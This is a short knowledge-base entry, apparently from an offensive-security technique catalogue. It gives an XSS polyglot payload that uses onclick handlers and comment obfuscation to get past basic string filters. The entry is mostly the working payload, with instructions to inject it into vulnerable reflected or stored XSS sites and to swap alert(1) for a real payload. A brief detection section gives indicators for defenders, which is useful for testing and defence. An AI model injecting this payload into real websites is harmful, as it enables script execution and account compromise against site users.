---
id: 8eb9f24c-a985-4a6d-b5e6-dadc59e5a72c
type: code
language: JavaScript
verified: true
created_at: '2023-04-06T03:56:42.286059+00:00'
updated_at: '2023-04-10T20:21:55.867714+00:00'
tags:
  - xss
  - polyglot
  - onclick
platforms:
  - Web
validated: true
---

# Onclick-Polyglot-XSS

## Code

```javascript
" onclick=alert(1)//<button ‘ onclick=alert(1)//> */ alert(1)//
```

## Description

Simple polyglot using onclick events with comment obfuscation to execute alert in attribute and script contexts, evading basic string filters.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| alert(1) | POC; customize for payload | alert(document.domain) |

## Usage

Inject into HTML attributes or buttons in vulnerable reflected/stored XSS sites to trigger on user interaction.

## Detection

- Event handler attributes like onclick in user input.
- Commented JS in logs.

## Related

- [[procedures/Polyglot-XSS-Attack-using-SVG-Image-Injection]]
